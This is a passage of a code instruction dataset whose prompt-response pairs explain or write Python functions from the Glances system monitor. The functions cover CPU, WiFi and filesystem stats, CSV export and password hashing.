ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['show_hide_network']))\n        ret.append(self.curse_add_line(self.view_data['show_hide_filesytem_freespace']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['show_hide_sensors']))\n        ret.append(self.curse_add_line(self.view_data['generate_graphs']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['show_hide_left_sidebar']))\n        ret.append(self.curse_add_line(self.view_data['reset_history']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['enable_disable_process_stats']))\n        ret.append(self.curse_add_line(self.view_data['show_hide_help']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['enable_disable_quick_look']))\n        ret.append(self.curse_add_line(self.view_data['diskio_iops']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['enable_disable_top_extends_stats']))\n        ret.append(self.curse_add_line(self.view_data['show_hide_top_menu']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['enable_disable_short_processname']))\n        ret.append(self.curse_add_line(self.view_data['show_hide_irq']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['enable_disable_gpu']))\n        ret.append(self.curse_add_line(self.view_data['enable_disable_mean_gpu']))\n        ret.append(self.curse_new_line())\n        ret.append(self.curse_add_line(self.view_data['enable_disable_irix']))\n        ret.append(self.curse_add_line(self.view_data['quit']))\n        ret.append(self.curse_new_line())\n\n        ret.append(self.curse_new_line())\n\n        ret.append(self.curse_add_line(self.view_data['edit_pattern_filter']))\n\n        # Return the message with decoration\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef value(self, new_value):\n        self._value = (datetime.now(), new_value)\n        self.history_add(self._value)", "response": "Set a value.\n        Value is a tuple: (<timestamp>, <new_value>)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nadding a value to the history.", "response": "def history_add(self, value):\n        \"\"\"Add a value in the history\n        \"\"\"\n        if self._history_max_size is None or self.history_len() < self._history_max_size:\n            self._history.append(value)\n        else:\n            self._history = self._history[1:] + [value]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef history_json(self, nb=0):\n        return [(i[0].isoformat(), i[1]) for i in self._history[-nb:]]", "response": "Return the history in ISO JSON format"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the mean on the nb values in the history.", "response": "def history_mean(self, nb=5):\n        \"\"\"Return the mean on the <nb> values in the history.\n        \"\"\"\n        _, v = zip(*self._history)\n        return sum(v[-nb:]) / float(v[-1] - v[-nb])"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nload the AMP configuration files.", "response": "def load_configs(self):\n        \"\"\"Load the AMP configuration files.\"\"\"\n        if self.config is None:\n            return False\n\n        # Display a warning (deprecated) message if the monitor section exist\n        if \"monitor\" in self.config.sections():\n            logger.warning(\"A deprecated [monitor] section exists in the Glances configuration file. You should use the new Applications Monitoring Process module instead (http://glances.readthedocs.io/en/develop/aoa/amps.html).\")\n\n        header = \"glances_\"\n        # For each AMP scrip, call the load_config method\n        for s in self.config.sections():\n            if s.startswith(\"amp_\"):\n                # An AMP section exists in the configuration file\n                # If an AMP script exist in the glances/amps folder, use it\n                amp_conf_name = s[4:]\n                amp_script = os.path.join(amps_path, header + s[4:] + \".py\")\n                if not os.path.exists(amp_script):\n                    # If not, use the default script\n                    amp_script = os.path.join(amps_path, \"glances_default.py\")\n                try:\n                    amp = __import__(os.path.basename(amp_script)[:-3])\n                except ImportError as e:\n                    logger.warning(\"Missing Python Lib ({}), cannot load {} AMP\".format(e, amp_conf_name))\n                except Exception as e:\n                    logger.warning(\"Cannot load {} AMP ({})\".format(amp_conf_name, e))\n                else:\n                    # Add the AMP to the dictionary\n                    # The key is the AMP name\n                    # for example, the file glances_xxx.py\n                    # generate self._amps_list[\"xxx\"] = ...\n                    self.__amps_dict[amp_conf_name] = amp.Amp(name=amp_conf_name, args=self.args)\n                    # Load the AMP configuration\n                    self.__amps_dict[amp_conf_name].load_config(self.config)\n        # Log AMPs list\n        logger.debug(\"AMPs list: {}\".format(self.getList()))\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nupdate the command result attributed.", "response": "def update(self):\n        \"\"\"Update the command result attributed.\"\"\"\n        # Get the current processes list (once)\n        processlist = glances_processes.getlist()\n\n        # Iter upon the AMPs dict\n        for k, v in iteritems(self.get()):\n            if not v.enable():\n                # Do not update if the enable tag is set\n                continue\n\n            amps_list = self._build_amps_list(v, processlist)\n\n            if len(amps_list) > 0:\n                # At least one process is matching the regex\n                logger.debug(\"AMPS: {} processes {} detected ({})\".format(len(amps_list),\n                                                                          k,\n                                                                          amps_list))\n                # Call the AMP update method\n                thread = threading.Thread(target=v.update_wrapper, args=[amps_list])\n                thread.start()\n            else:\n                # Set the process number to 0\n                v.set_count(0)\n                if v.count_min() is not None and v.count_min() > 0:\n                    # Only display the \"No running process message\" if countmin is defined\n                    v.set_result(\"No running process\")\n\n        return self.__amps_dict"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds the AMPS process list according to the amp_value", "response": "def _build_amps_list(self, amp_value, processlist):\n        \"\"\"Return the AMPS process list according to the amp_value\n\n        Search application monitored processes by a regular expression\n        \"\"\"\n        ret = []\n        try:\n            # Search in both cmdline and name (for kernel thread, see #1261)\n            for p in processlist:\n                add_it = False\n                if (re.search(amp_value.regex(), p['name']) is not None):\n                    add_it = True\n                else:\n                    for c in p['cmdline']:\n                        if (re.search(amp_value.regex(), c) is not None):\n                            add_it = True\n                            break\n                if add_it:\n                    ret.append({'pid': p['pid'],\n                                'cpu_percent': p['cpu_percent'],\n                                'memory_percent': p['memory_percent']})\n\n        except (TypeError, KeyError) as e:\n            logger.debug(\"Can not build AMPS list ({})\".format(e))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nupdating the stats in the CSV output file.", "response": "def update(self, stats):\n        \"\"\"Update stats in the CSV output file.\"\"\"\n        # Get the stats\n        all_stats = stats.getAllExportsAsDict(plugin_list=self.plugins_to_export())\n\n        # Init data with timestamp (issue#708)\n        if self.first_line:\n            csv_header = ['timestamp']\n        csv_data = [time.strftime('%Y-%m-%d %H:%M:%S')]\n\n        # Loop over plugins to export\n        for plugin in self.plugins_to_export():\n            if isinstance(all_stats[plugin], list):\n                for stat in all_stats[plugin]:\n                    # First line: header\n                    if self.first_line:\n                        csv_header += ('{}_{}_{}'.format(\n                            plugin, self.get_item_key(stat), item) for item in stat)\n                    # Others lines: stats\n                    csv_data += itervalues(stat)\n            elif isinstance(all_stats[plugin], dict):\n                # First line: header\n                if self.first_line:\n                    fieldnames = iterkeys(all_stats[plugin])\n                    csv_header += ('{}_{}'.format(plugin, fieldname)\n                                   for fieldname in fieldnames)\n                # Others lines: stats\n                csv_data += itervalues(all_stats[plugin])\n\n        # Export to CSV\n        if self.first_line:\n            self.writer.writerow(csv_header)\n            self.first_line = False\n        self.writer.writerow(csv_data)\n        self.csv_file.flush()"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates and return the CPU using the psutil library.", "response": "def __get_cpu(self):\n        \"\"\"Update and/or return the CPU using the psutil library.\"\"\"\n        # Never update more than 1 time per cached_time\n        if self.timer_cpu.finished():\n            self.cpu_percent = psutil.cpu_percent(interval=0.0)\n            # Reset timer for cache\n            self.timer_cpu = Timer(self.cached_time)\n        return self.cpu_percent"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates and return the per CPU list using the psutil library.", "response": "def __get_percpu(self):\n        \"\"\"Update and/or return the per CPU list using the psutil library.\"\"\"\n        # Never update more than 1 time per cached_time\n        if self.timer_percpu.finished():\n            self.percpu_percent = []\n            for cpu_number, cputimes in enumerate(psutil.cpu_times_percent(interval=0.0, percpu=True)):\n                cpu = {'key': self.get_key(),\n                       'cpu_number': cpu_number,\n                       'total': round(100 - cputimes.idle, 1),\n                       'user': cputimes.user,\n                       'system': cputimes.system,\n                       'idle': cputimes.idle}\n                # The following stats are for API purposes only\n                if hasattr(cputimes, 'nice'):\n                    cpu['nice'] = cputimes.nice\n                if hasattr(cputimes, 'iowait'):\n                    cpu['iowait'] = cputimes.iowait\n                if hasattr(cputimes, 'irq'):\n                    cpu['irq'] = cputimes.irq\n                if hasattr(cputimes, 'softirq'):\n                    cpu['softirq'] = cputimes.softirq\n                if hasattr(cputimes, 'steal'):\n                    cpu['steal'] = cputimes.steal\n                if hasattr(cputimes, 'guest'):\n                    cpu['guest'] = cputimes.guest\n                if hasattr(cputimes, 'guest_nice'):\n                    cpu['guest_nice'] = cputimes.guest_nice\n                # Append new CPU to the list\n                self.percpu_percent.append(cpu)\n                # Reset timer for cache\n                self.timer_percpu = Timer(self.cached_time)\n        return self.percpu_percent"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef serve_forever(self):\n        loop = True\n        while loop:\n            loop = self.__serve_forever()\n        self.end()", "response": "Wrapper to the serve_forever function."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nends of the standalone CLI.", "response": "def end(self):\n        \"\"\"End of the standalone CLI.\"\"\"\n        if not self.quiet:\n            self.screen.end()\n\n        # Exit from export modules\n        self.stats.end()\n\n        # Check Glances version versus PyPI one\n        if self.outdated.is_outdated():\n            print(\"You are using Glances version {}, however version {} is available.\".format(\n                self.outdated.installed_version(), self.outdated.latest_version()))\n            print(\"You should consider upgrading using: pip install --upgrade glances\")"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the hashed password salt + SHA - 256.", "response": "def get_hash(self, salt, plain_password):\n        \"\"\"Return the hashed password, salt + SHA-256.\"\"\"\n        return hashlib.sha256(salt.encode() + plain_password.encode()).hexdigest()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef hash_password(self, plain_password):\n        salt = uuid.uuid4().hex\n        encrypted_password = self.get_hash(salt, plain_password)\n        return salt + '$' + encrypted_password", "response": "Hash a plain password with a salt based on UUID"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef check_password(self, hashed_password, plain_password):\n        salt, encrypted_password = hashed_password.split('$')\n        re_encrypted_password = self.get_hash(salt, plain_password)\n        return encrypted_password == re_encrypted_password", "response": "Encode the plain_password with the salt of the hashed_password. Return the comparison with the encrypted_password."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets the password from a Glances server or client.", "response": "def get_password(self, description='', confirm=False, clear=False):\n        \"\"\"Get the password from a Glances client or server.\n\n        For Glances server, get the password (confirm=True, clear=False):\n            1) from the password file (if it exists)\n            2) from the CLI\n        Optionally: save the password to a file (hashed with salt + SHA-256)\n\n        For Glances client, get the password (confirm=False, clear=True):\n            1) from the CLI\n            2) the password is hashed with SHA-256 (only SHA string transit\n               through the network)\n        \"\"\"\n        if os.path.exists(self.password_file) and not clear:\n            # If the password file exist then use it\n            logger.info(\"Read password from file {}\".format(self.password_file))\n            password = self.load_password()\n        else:\n            # password_sha256 is the plain SHA-256 password\n            # password_hashed is the salt + SHA-256 password\n            password_sha256 = self.sha256_hash(getpass.getpass(description))\n            password_hashed = self.hash_password(password_sha256)\n            if confirm:\n                # password_confirm is the clear password (only used to compare)\n                password_confirm = self.sha256_hash(getpass.getpass('Password (confirm): '))\n\n                if not self.check_password(password_hashed, password_confirm):\n                    logger.critical(\"Sorry, passwords do not match. Exit.\")\n                    sys.exit(1)\n\n            # Return the plain SHA-256 or the salted password\n            if clear:\n                password = password_sha256\n            else:\n                password = password_hashed\n\n            # Save the hashed password to the password file\n            if not clear:\n                save_input = input('Do you want to save the password? [Yes/No]: ')\n                if len(save_input) > 0 and save_input[0].upper() == 'Y':\n                    self.save_password(password_hashed)\n\n        return password"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef save_password(self, hashed_password):\n        # Create the glances directory\n        safe_makedirs(self.password_dir)\n\n        # Create/overwrite the password file\n        with open(self.password_file, 'wb') as file_pwd:\n            file_pwd.write(b(hashed_password))", "response": "Save the hashed password to the Glances folder."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef load_password(self):\n        # Read the password file, if it exists\n        with open(self.password_file, 'r') as file_pwd:\n            hashed_password = file_pwd.read()\n\n        return hashed_password", "response": "Load the hashed password from the Glances folder."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self):\n\n        # Grab stats into self.stats\n        if self.input_method == 'local':\n            stats = self.update_local()\n        elif self.input_method == 'snmp':\n            stats = self.update_snmp()\n        else:\n            stats = self.get_init_value()\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update CPU stats using the input method."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef update_local(self):\n        # Grab CPU stats using psutil's cpu_percent and cpu_times_percent\n        # Get all possible values for CPU stats: user, system, idle,\n        # nice (UNIX), iowait (Linux), irq (Linux, FreeBSD), steal (Linux 2.6.11+)\n        # The following stats are returned by the API but not displayed in the UI:\n        # softirq (Linux), guest (Linux 2.6.24+), guest_nice (Linux 3.2.0+)\n\n        # Init new stats\n        stats = self.get_init_value()\n\n        stats['total'] = cpu_percent.get()\n        cpu_times_percent = psutil.cpu_times_percent(interval=0.0)\n        for stat in ['user', 'system', 'idle', 'nice', 'iowait',\n                     'irq', 'softirq', 'steal', 'guest', 'guest_nice']:\n            if hasattr(cpu_times_percent, stat):\n                stats[stat] = getattr(cpu_times_percent, stat)\n\n        # Additional CPU stats (number of events not as a %; psutil>=4.1.0)\n        # ctx_switches: number of context switches (voluntary + involuntary) per second\n        # interrupts: number of interrupts per second\n        # soft_interrupts: number of software interrupts per second. Always set to 0 on Windows and SunOS.\n        # syscalls: number of system calls since boot. Always set to 0 on Linux.\n        cpu_stats = psutil.cpu_stats()\n        # By storing time data we enable Rx/s and Tx/s calculations in the\n        # XML/RPC API, which would otherwise be overly difficult work\n        # for users of the API\n        time_since_update = getTimeSinceLastUpdate('cpu')\n\n        # Previous CPU stats are stored in the cpu_stats_old variable\n        if not hasattr(self, 'cpu_stats_old'):\n            # First call, we init the cpu_stats_old var\n            self.cpu_stats_old = cpu_stats\n        else:\n            for stat in cpu_stats._fields:\n                if getattr(cpu_stats, stat) is not None:\n                    stats[stat] = getattr(cpu_stats, stat) - getattr(self.cpu_stats_old, stat)\n\n            stats['time_since_update'] = time_since_update\n\n            # Core number is needed to compute the CTX switch limit\n            stats['cpucore'] = self.nb_log_core\n\n            # Save stats to compute next step\n            self.cpu_stats_old = cpu_stats\n\n        return stats", "response": "Update the CPU stats using the local API."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates CPU stats using SNMP.", "response": "def update_snmp(self):\n        \"\"\"Update CPU stats using SNMP.\"\"\"\n\n        # Init new stats\n        stats = self.get_init_value()\n\n        # Update stats using SNMP\n        if self.short_system_name in ('windows', 'esxi'):\n            # Windows or VMWare ESXi\n            # You can find the CPU utilization of windows system by querying the oid\n            # Give also the number of core (number of element in the table)\n            try:\n                cpu_stats = self.get_stats_snmp(snmp_oid=snmp_oid[self.short_system_name],\n                                                bulk=True)\n            except KeyError:\n                self.reset()\n\n            # Iter through CPU and compute the idle CPU stats\n            stats['nb_log_core'] = 0\n            stats['idle'] = 0\n            for c in cpu_stats:\n                if c.startswith('percent'):\n                    stats['idle'] += float(cpu_stats['percent.3'])\n                    stats['nb_log_core'] += 1\n            if stats['nb_log_core'] > 0:\n                stats['idle'] = stats['idle'] / stats['nb_log_core']\n            stats['idle'] = 100 - stats['idle']\n            stats['total'] = 100 - stats['idle']\n\n        else:\n            # Default behavor\n            try:\n                stats = self.get_stats_snmp(\n                    snmp_oid=snmp_oid[self.short_system_name])\n            except KeyError:\n                stats = self.get_stats_snmp(\n                    snmp_oid=snmp_oid['default'])\n\n            if stats['idle'] == '':\n                self.reset()\n                return self.stats\n\n            # Convert SNMP stats to float\n            for key in iterkeys(stats):\n                stats[key] = float(stats[key])\n            stats['total'] = 100 - stats['idle']\n\n        return stats"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef msg_curse(self, args=None, max_width=None):\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and plugin not disable\n        if not self.stats or self.args.percpu or self.is_disable():\n            return ret\n\n        # Build the string message\n        # If user stat is not here, display only idle / total CPU usage (for\n        # exemple on Windows OS)\n        idle_tag = 'user' not in self.stats\n\n        # Header\n        msg = '{}'.format('CPU')\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        trend_user = self.get_trend('user')\n        trend_system = self.get_trend('system')\n        if trend_user is None or trend_user is None:\n            trend_cpu = None\n        else:\n            trend_cpu = trend_user + trend_system\n        msg = ' {:4}'.format(self.trend_msg(trend_cpu))\n        ret.append(self.curse_add_line(msg))\n        # Total CPU usage\n        msg = '{:5.1f}%'.format(self.stats['total'])\n        if idle_tag:\n            ret.append(self.curse_add_line(\n                msg, self.get_views(key='total', option='decoration')))\n        else:\n            ret.append(self.curse_add_line(msg))\n        # Nice CPU\n        if 'nice' in self.stats:\n            msg = '  {:8}'.format('nice:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='nice', option='optional')))\n            msg = '{:5.1f}%'.format(self.stats['nice'])\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='nice', option='optional')))\n        # ctx_switches\n        if 'ctx_switches' in self.stats:\n            msg = '  {:8}'.format('ctx_sw:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='ctx_switches', option='optional')))\n            msg = '{:>5}'.format(self.auto_unit(int(self.stats['ctx_switches'] // self.stats['time_since_update']),\n                                                min_symbol='K'))\n            ret.append(self.curse_add_line(\n                msg, self.get_views(key='ctx_switches', option='decoration'),\n                optional=self.get_views(key='ctx_switches', option='optional')))\n\n        # New line\n        ret.append(self.curse_new_line())\n        # User CPU\n        if 'user' in self.stats:\n            msg = '{:8}'.format('user:')\n            ret.append(self.curse_add_line(msg))\n            msg = '{:5.1f}%'.format(self.stats['user'])\n            ret.append(self.curse_add_line(\n                msg, self.get_views(key='user', option='decoration')))\n        elif 'idle' in self.stats:\n            msg = '{:8}'.format('idle:')\n            ret.append(self.curse_add_line(msg))\n            msg = '{:5.1f}%'.format(self.stats['idle'])\n            ret.append(self.curse_add_line(msg))\n        # IRQ CPU\n        if 'irq' in self.stats:\n            msg = '  {:8}'.format('irq:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='irq', option='optional')))\n            msg = '{:5.1f}%'.format(self.stats['irq'])\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='irq', option='optional')))\n        # interrupts\n        if 'interrupts' in self.stats:\n            msg = '  {:8}'.format('inter:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='interrupts', option='optional')))\n            msg = '{:>5}'.format(int(self.stats['interrupts'] // self.stats['time_since_update']))\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='interrupts', option='optional')))\n\n        # New line\n        ret.append(self.curse_new_line())\n        # System CPU\n        if 'system' in self.stats and not idle_tag:\n            msg = '{:8}'.format('system:')\n            ret.append(self.curse_add_line(msg))\n            msg = '{:5.1f}%'.format(self.stats['system'])\n            ret.append(self.curse_add_line(\n                msg, self.get_views(key='system', option='decoration')))\n        else:\n            msg = '{:8}'.format('core:')\n            ret.append(self.curse_add_line(msg))\n            msg = '{:>6}'.format(self.stats['nb_log_core'])\n            ret.append(self.curse_add_line(msg))\n        # IOWait CPU\n        if 'iowait' in self.stats:\n            msg = '  {:8}'.format('iowait:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='iowait', option='optional')))\n            msg = '{:5.1f}%'.format(self.stats['iowait'])\n            ret.append(self.curse_add_line(\n                msg, self.get_views(key='iowait', option='decoration'),\n                optional=self.get_views(key='iowait', option='optional')))\n        # soft_interrupts\n        if 'soft_interrupts' in self.stats:\n            msg = '  {:8}'.format('sw_int:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='soft_interrupts', option='optional')))\n            msg = '{:>5}'.format(int(self.stats['soft_interrupts'] // self.stats['time_since_update']))\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='soft_interrupts', option='optional')))\n\n        # New line\n        ret.append(self.curse_new_line())\n        # Idle CPU\n        if 'idle' in self.stats and not idle_tag:\n            msg = '{:8}'.format('idle:')\n            ret.append(self.curse_add_line(msg))\n            msg = '{:5.1f}%'.format(self.stats['idle'])\n            ret.append(self.curse_add_line(msg))\n        # Steal CPU usage\n        if 'steal' in self.stats:\n            msg = '  {:8}'.format('steal:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='steal', option='optional')))\n            msg = '{:5.1f}%'.format(self.stats['steal'])\n            ret.append(self.curse_add_line(\n                msg, self.get_views(key='steal', option='decoration'),\n                optional=self.get_views(key='steal', option='optional')))\n        # syscalls\n        # syscalls: number of system calls since boot. Always set to 0 on Linux. (do not display)\n        if 'syscalls' in self.stats and not LINUX:\n            msg = '  {:8}'.format('syscal:')\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='syscalls', option='optional')))\n            msg = '{:>5}'.format(int(self.stats['syscalls'] // self.stats['time_since_update']))\n            ret.append(self.curse_add_line(msg, optional=self.get_views(key='syscalls', option='optional')))\n\n        # Return the message with decoration\n        return ret", "response": "Return the list of messages to display in the UI."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates Wifi stats using the input method.", "response": "def update(self):\n        \"\"\"Update Wifi stats using the input method.\n\n        Stats is a list of dict (one dict per hotspot)\n\n        :returns: list -- Stats is a list of dict (hotspot)\n        \"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        # Exist if we can not grab the stats\n        if import_error_tag:\n            return stats\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n\n            # Grab network interface stat using the psutil net_io_counter method\n            try:\n                netiocounters = psutil.net_io_counters(pernic=True)\n            except UnicodeDecodeError:\n                return stats\n\n            for net in netiocounters:\n                # Do not take hidden interface into account\n                if self.is_hide(net):\n                    continue\n\n                # Grab the stats using the Wifi Python lib\n                try:\n                    wifi_cells = Cell.all(net)\n                except InterfaceError as e:\n                    # Not a Wifi interface\n                    logger.debug(\"WIFI plugin: Scan InterfaceError ({})\".format(e))\n                    pass\n                except Exception as e:\n                    # Other error\n                    logger.debug(\"WIFI plugin: Can not grab cellule stats ({})\".format(e))\n                    pass\n                else:\n                    for wifi_cell in wifi_cells:\n                        hotspot = {\n                            'key': self.get_key(),\n                            'ssid': wifi_cell.ssid,\n                            'signal': wifi_cell.signal,\n                            'quality': wifi_cell.quality,\n                            'encrypted': wifi_cell.encrypted,\n                            'encryption_type': wifi_cell.encryption_type if wifi_cell.encrypted else None\n                        }\n                        # Add the hotspot to the list\n                        stats.append(hotspot)\n\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n\n            # Not implemented yet\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\noverwrite the default get_alert method to provide a specific alert.", "response": "def get_alert(self, value):\n        \"\"\"Overwrite the default get_alert method.\n\n        Alert is on signal quality where lower is better...\n\n        :returns: string -- Signal alert\n        \"\"\"\n        ret = 'OK'\n        try:\n            if value <= self.get_limit('critical', stat_name=self.plugin_name):\n                ret = 'CRITICAL'\n            elif value <= self.get_limit('warning', stat_name=self.plugin_name):\n                ret = 'WARNING'\n            elif value <= self.get_limit('careful', stat_name=self.plugin_name):\n                ret = 'CAREFUL'\n        except (TypeError, KeyError) as e:\n            # Catch TypeError for issue1373\n            ret = 'DEFAULT'\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and display plugin enable...\n        if not self.stats or import_error_tag or self.is_disable():\n            return ret\n\n        # Max size for the interface name\n        ifname_max_width = max_width - 5\n\n        # Build the string message\n        # Header\n        msg = '{:{width}}'.format('WIFI', width=ifname_max_width)\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        msg = '{:>7}'.format('dBm')\n        ret.append(self.curse_add_line(msg))\n\n        # Hotspot list (sorted by name)\n        for i in sorted(self.stats, key=operator.itemgetter(self.get_key())):\n            # Do not display hotspot with no name (/ssid)...\n            # of ssid/signal None... See issue #1151 and #issue1973\n            if i['ssid'] == '' or i['ssid'] is None or i['signal'] is None:\n                continue\n            ret.append(self.curse_new_line())\n            # New hotspot\n            hotspotname = i['ssid']\n            # Add the encryption type (if it is available)\n            if i['encrypted']:\n                hotspotname += ' {}'.format(i['encryption_type'])\n            # Cut hotspotname if it is too long\n            if len(hotspotname) > ifname_max_width:\n                hotspotname = '_' + hotspotname[-ifname_max_width + 1:]\n            # Add the new hotspot to the message\n            msg = '{:{width}}'.format(nativestr(hotspotname),\n                                      width=ifname_max_width)\n            ret.append(self.curse_add_line(msg))\n            msg = '{:>7}'.format(i['signal'], width=ifname_max_width)\n            ret.append(self.curse_add_line(msg,\n                                           self.get_views(item=i[self.get_key()],\n                                                          key='signal',\n                                                          option='decoration')))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates the FS stats using the input method.", "response": "def update(self):\n        \"\"\"Update the FS stats using the input method.\"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n\n            # Grab the stats using the psutil disk_partitions\n            # If 'all'=False return physical devices only (e.g. hard disks, cd-rom drives, USB keys)\n            # and ignore all others (e.g. memory partitions such as /dev/shm)\n            try:\n                fs_stat = psutil.disk_partitions(all=False)\n            except UnicodeDecodeError:\n                return self.stats\n\n            # Optionnal hack to allow logicals mounts points (issue #448)\n            # Ex: Had to put 'allow=zfs' in the [fs] section of the conf file\n            #     to allow zfs monitoring\n            for fstype in self.get_conf_value('allow'):\n                try:\n                    fs_stat += [f for f in psutil.disk_partitions(all=True) if f.fstype.find(fstype) >= 0]\n                except UnicodeDecodeError:\n                    return self.stats\n\n            # Loop over fs\n            for fs in fs_stat:\n                # Do not take hidden file system into account\n                if self.is_hide(fs.mountpoint):\n                    continue\n                # Grab the disk usage\n                try:\n                    fs_usage = psutil.disk_usage(fs.mountpoint)\n                except OSError:\n                    # Correct issue #346\n                    # Disk is ejected during the command\n                    continue\n                fs_current = {\n                    'device_name': fs.device,\n                    'fs_type': fs.fstype,\n                    # Manage non breaking space (see issue #1065)\n                    'mnt_point': u(fs.mountpoint).replace(u'\\u00A0', ' '),\n                    'size': fs_usage.total,\n                    'used': fs_usage.used,\n                    'free': fs_usage.free,\n                    'percent': fs_usage.percent,\n                    'key': self.get_key()}\n                stats.append(fs_current)\n\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n\n            # SNMP bulk command to get all file system in one shot\n            try:\n                fs_stat = self.get_stats_snmp(snmp_oid=snmp_oid[self.short_system_name],\n                                              bulk=True)\n            except KeyError:\n                fs_stat = self.get_stats_snmp(snmp_oid=snmp_oid['default'],\n                                              bulk=True)\n\n            # Loop over fs\n            if self.short_system_name in ('windows', 'esxi'):\n                # Windows or ESXi tips\n                for fs in fs_stat:\n                    # Memory stats are grabbed in the same OID table (ignore it)\n                    if fs == 'Virtual Memory' or fs == 'Physical Memory' or fs == 'Real Memory':\n                        continue\n                    size = int(fs_stat[fs]['size']) * int(fs_stat[fs]['alloc_unit'])\n                    used = int(fs_stat[fs]['used']) * int(fs_stat[fs]['alloc_unit'])\n                    percent = float(used * 100 / size)\n                    fs_current = {\n                        'device_name': '',\n                        'mnt_point': fs.partition(' ')[0],\n                        'size': size,\n                        'used': used,\n                        'percent': percent,\n                        'key': self.get_key()}\n                    stats.append(fs_current)\n            else:\n                # Default behavior\n                for fs in fs_stat:\n                    fs_current = {\n                        'device_name': fs_stat[fs]['device_name'],\n                        'mnt_point': fs,\n                        'size': int(fs_stat[fs]['size']) * 1024,\n                        'used': int(fs_stat[fs]['used']) * 1024,\n                        'percent': float(fs_stat[fs]['percent']),\n                        'key': self.get_key()}\n                    stats.append(fs_current)\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and display plugin enable...\n        if not self.stats or self.is_disable():\n            return ret\n\n        # Max size for the interface name\n        name_max_width = max_width - 12\n\n        # Build the string message\n        # Header\n        msg = '{:{width}}'.format('FILE SYS', width=name_max_width)\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        if args.fs_free_space:\n            msg = '{:>7}'.format('Free')\n        else:\n            msg = '{:>7}'.format('Used')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>7}'.format('Total')\n        ret.append(self.curse_add_line(msg))\n\n        # Filesystem list (sorted by name)\n        for i in sorted(self.stats, key=operator.itemgetter(self.get_key())):\n            # New line\n            ret.append(self.curse_new_line())\n            if i['device_name'] == '' or i['device_name'] == 'none':\n                mnt_point = i['mnt_point'][-name_max_width + 1:]\n            elif len(i['mnt_point']) + 